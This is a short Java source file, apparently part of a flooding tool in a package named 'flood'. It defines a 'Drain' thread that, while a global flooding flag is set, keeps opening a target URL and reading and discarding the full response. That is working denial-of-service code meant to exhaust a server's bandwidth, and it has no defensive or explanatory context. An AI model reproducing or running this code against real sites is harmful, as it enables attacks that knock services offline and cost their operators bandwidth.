package com.redpois0n.flood;
import java.io.BufferedInputStream;
import java.net.URL;

import com.redpois0n.Constants;

public class Drain extends Thread {

	public String target;

	public Drain(String t) {
		target = t;
	}

	@SuppressWarnings("unused")
	public void run() {
		while (Constants.flooding) {
			try {
				BufferedInputStream in = new BufferedInputStream(new URL(target).openStream());
				byte data[] = new byte[1024];
				int count;
				while ((count = in.read(data, 0, 1024)) != -1) {
					// fout.write(data, 0, count);
				}
				in.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

}
